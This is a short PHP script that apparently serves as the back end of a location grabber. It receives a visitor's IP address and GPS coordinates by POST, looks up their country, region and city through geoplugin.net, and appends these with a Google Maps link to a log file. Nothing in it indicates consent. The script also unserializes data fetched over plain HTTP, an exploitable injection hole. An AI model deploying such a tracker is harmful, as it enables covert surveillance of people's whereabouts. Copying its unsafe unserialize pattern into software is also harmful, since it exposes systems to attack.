<?php

date_default_timezone_set('Europe/Paris');
$geoplugin = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$_POST['ip']));
$f = "singe.log";
$fo = fopen($f, "a+");
$ti = "##########################";
$position = "https://www.google.com/maps?q=".$_POST['latitude'].",".$_POST['longitude'];
$date = date("d.m.Y, H:i:s");
$ip = $_POST['ip'];
$crc = "Country : ".$geoplugin['geoplugin_countryCode']."\nRegion : ".$geoplugin['geoplugin_region']."\nCity : ".$geoplugin['geoplugin_city'];
$lmao = $ti."\nDate : ".$date."\nIP : ".$ip."\nPosition : ".$position."\n".$crc."\n".$ti."\n\n";

if($fo) {
fwrite($fo, $lmao);
fclose($fo);
}

?>